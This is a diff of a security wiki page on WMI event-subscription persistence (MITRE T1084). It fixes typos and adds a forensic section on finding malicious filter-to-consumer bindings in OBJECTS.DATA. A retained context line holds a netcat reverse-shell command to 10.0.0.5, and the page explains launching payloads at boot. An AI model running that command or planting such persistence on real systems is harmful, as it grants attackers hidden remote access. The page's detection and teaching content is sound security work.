@@ -1,5 +1,5 @@
 ---
-description: 'Persistence, privilege escalation via WMI.'
+description: 'Persistence, privilege escalation via WMI. Test'
 ---
 
 # T1084: Abusing Windows Managent Instrumentation
@@ -10,7 +10,7 @@ WMI events are made up of 3 key pieces:
 * event consumers - consumers can carry out actions when event filters are triggered \(i.e run a program, log to a log file, execute a script, etc\)
 * filter to consumer bindings - the gluing matter that marries event filters and event consumers together in order for the event consumers.
 
-WMI Events can be used by both offenders \(persistance, i.e launch payload when system is booted\) as well as defenders \(kill process evil.exe on its creation\).
+WMI Events can be used by both offenders \(persistence, i.e launch payload when system is booted\) as well as defenders \(kill process evil.exe on its creation\).
 
 ## Execution
 
@@ -66,7 +66,7 @@ C:\tools\nc.exe 10.0.0.5 443 -e C:\Windows\System32\cmd.exe
 
 ## Observations
 
-Note the process ancesry of the shell - as usual, wmi/winrm spawns processes from `WmiPrvSE.exe`:
+Note the process ancestry of the shell - as usual, wmi/winrm spawns processes from `WmiPrvSE.exe`:
 
 ![](../../.gitbook/assets/wmi-shell-system.png)
 
@@ -80,21 +80,21 @@ Get-WmiObject -Class __EventFilter -Namespace root\subscription
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-Note the Query which suggests this wmi filters is checking system uptime every 5 seconds and is checking if its value is more or equal to 1200s:
+Note the `Query` property which suggests this wmi filter is checking system's uptime every 5 seconds and is checking if the system has been up for at least 1200 seconds:
 
 ![](../../.gitbook/assets/wmi-filter.png)
+
+Event consumer, suggesting that the `shell.cmd` will be executed upon invokation as specified in the property `ExecutablePath`:
 
 {% code-tabs %}
 {% code-tabs-item title="\_\_EventConsumer@victim" %}
 ```csharp
-Get-WmiObject -Class __EventConsumer -Namespace root\subscription:
+Get-WmiObject -Class __EventConsumer -Namespace root\subscription
 ```
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
 ![](../../.gitbook/assets/wmi-consumer.png)
-
-
 
 {% code-tabs %}
 {% code-tabs-item title="\_\_FilterToConsumerBinding@victim" %}
@@ -106,17 +106,51 @@ Get-WmiObject -Class __FilterToConsumerBinding -Namespace root\subscription
 
 ![](../../.gitbook/assets/wmi-binding.png)
 
-Microsoft-Windows-WMI-Activity/Operational logs contains logs for event `5861` that capture the event filter and event consumer creations:
+Microsoft-Windows-WMI-Activity/Operational contains logs for event `5861` that capture  event filter and event consumer creations on the victim system:
 
 ![](../../.gitbook/assets/wmi-filter-consumer-creation.png)
+
+## Inspection
+
+If you suspect the host to be compromised and you want to inspect any `FilterToConsumer` bindings, you may not want to PSRemote to the machine since the attacker is already at least a local admin on that box since it is required to create bindings.
+
+Try getting the `%SystemRoot%\System32\wbem\Repository\OBJECTS.DATA`
+
+Then you can use [PyWMIPersistenceFinder.py](https://github.com/davidpany/WMI_Forensics) by David Pany to parse the `OBJECTS.DATA` file and get a list of bindings like so:
+
+```bash
+./PyWMIPersistenceFinder.py OBJECTS.DATA
+```
+
+![](../../.gitbook/assets/wmi-parser.png)
+
+### Strings + Grep
+
+If you are limited to only the native \*nix utils you have to hand, you can get a pretty good insight into the bindings with the following command:
+
+```csharp
+strings OBJECTS.DATA | grep -i filtertoconsumerbinding -A 3 --color
+```
+
+Below are the results and we can easily see that one binding connects two evils - the evil consumer and the evil filter - see highlighted:
+
+![](../../.gitbook/assets/wmi-strings-grep.png)
+
+Now that you know that you are dealing with `evil` filter and consumer, try  another rudimentary piped command:
+
+```csharp
+strings OBJECTS.DATA | grep -i 'evil' -B3 -A2 --color
+```
+
+Note how we can get a pretty decent glimpse into the malicious WMI persistence - note the `C:\shell.cmd`and `SELECT * FROM` ... - if you recall, this is what we put in our consumers and filters at the very [beginning](./#execution):
+
+![](../../.gitbook/assets/wmi-strings-grep2.png)
 
 Based on the research by [Matthew Graeber](https://twitter.com/mattifestation) and other great resources listed below: 
 
 {% embed data="{\"url\":\"https://learn-powershell.net/2013/08/14/powershell-and-events-permanent-wmi-event-subscriptions/\",\"type\":\"link\",\"title\":\"PowerShell and Events: Permanent WMI Event Subscriptions\",\"description\":\"Wrapping up my series on PowerShell and Events, I will be talking about Permanent WMI Event Subscriptions and creating these using PowerShell. Mentioned in my previous article on temporary events, …\",\"icon\":{\"type\":\"icon\",\"url\":\"https://s1.wp.com/i/favicon.ico\",\"aspectRatio\":0},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://boeprox.files.wordpress.com/2013/08/image\_thumb29.png\",\"width\":613,\"height\":98,\"aspectRatio\":0.1598694942903752}}" %}
 
 {% embed data="{\"url\":\"https://www.youtube.com/watch?v=0SjMgnGwpq8\",\"type\":\"video\",\"title\":\"Abusing Windows Management Instrumentation \(WMI\)\",\"description\":\"by Matthew Graeber\\n\\nImagine a technology that is built into every Windows operating system going back to Windows 95, runs as System, executes arbitrary code, persists across reboots, and does not drop a single file to disk. Such a thing does exist and it\'s called Windows Management Instrumentation \(WMI\).\\n\\nWith increased scrutiny from anti-virus and \'next-gen\' host endpoints, advanced red teams and attackers already know that the introduction of binaries into a high-security environment is subject to increased scrutiny. WMI enables an attacker practicing a minimalist methodology to blend into their target environment without dropping a single utility to disk. WMI is also unlike other persistence techniques in that rather than executing a payload at a predetermined time, WMI conditionally executes code asynchronously in response to operating system events.\\n\\nThis talk will introduce WMI and demonstrate its offensive uses. We will cover what WMI is, how attackers are currently using it in the wild, how to build a full-featured backdoor, and how to detect and prevent these attacks from occurring.\",\"icon\":{\"type\":\"icon\",\"url\":\"https://www.youtube.com/yts/img/favicon\_144-vfliLAfaB.png\",\"width\":144,\"height\":144,\"aspectRatio\":1},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://i.ytimg.com/vi/0SjMgnGwpq8/maxresdefault.jpg\",\"width\":1280,\"height\":720,\"aspectRatio\":0.5625},\"embed\":{\"type\":\"player\",\"url\":\"https://www.youtube.com/embed/0SjMgnGwpq8?rel=0&showinfo=0\",\"html\":\"<div style=\\\"left: 0; width: 100%; height: 0; position: relative; padding-bottom: 56.2493%;\\\"><iframe src=\\\"https://www.youtube.com/embed/0SjMgnGwpq8?rel=0&amp;showinfo=0\\\" style=\\\"border: 0; top: 0; left: 0; width: 100%; height: 100%; position: absolute;\\\" allowfullscreen scrolling=\\\"no\\\"></iframe></div>\",\"aspectRatio\":1.7778}}" %}
-
-{% embed data="{\"url\":\"https://github.com/mattifestation/WMI\_Backdoor/blob/master/Black\_Hat\_2015\_Presentation/us15-Graeber-AbusingWindowsManagementInstrumentation.pdf\",\"type\":\"link\",\"title\":\"mattifestation/WMI\_Backdoor\",\"description\":\"WMI\_Backdoor - A PoC WMI backdoor presented at Black Hat 2015\",\"icon\":{\"type\":\"icon\",\"url\":\"https://github.com/fluidicon.png\",\"aspectRatio\":0},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://avatars3.githubusercontent.com/u/1781087?s=400&v=4\",\"width\":420,\"height\":420,\"aspectRatio\":1}}" %}
 
 {% embed data="{\"url\":\"https://attack.mitre.org/wiki/Technique/T1084\",\"type\":\"link\",\"title\":\"Windows Management Instrumentation Event Subscription - ATT&CK for Enterprise\"}" %}
 
@@ -129,10 +163,4 @@ Based on the research by [Matthew Graeber](https://twitter.com/mattifestation) a
 {% embed data="{\"url\":\"https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/\",\"type\":\"link\",\"title\":\"Tales of a Threat Hunter 2\",\"description\":\"Following the trace of WMI Backdoors & other nastiness\"}" %}
 
 {% embed data="{\"url\":\"https://docs.microsoft.com/en-us/previous-versions/windows/embedded/aa940177\(v=winembedded.5\)\",\"type\":\"link\",\"title\":\"WMI Consumers\",\"icon\":{\"type\":\"icon\",\"url\":\"https://docs.microsoft.com/favicon.ico\",\"aspectRatio\":0},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://docs.microsoft.com/\_themes/docs.theme/master/en-us/\_themes/images/microsoft-header.png\",\"width\":128,\"height\":128,\"aspectRatio\":1}}" %}
-
-
-
-
-
-
 
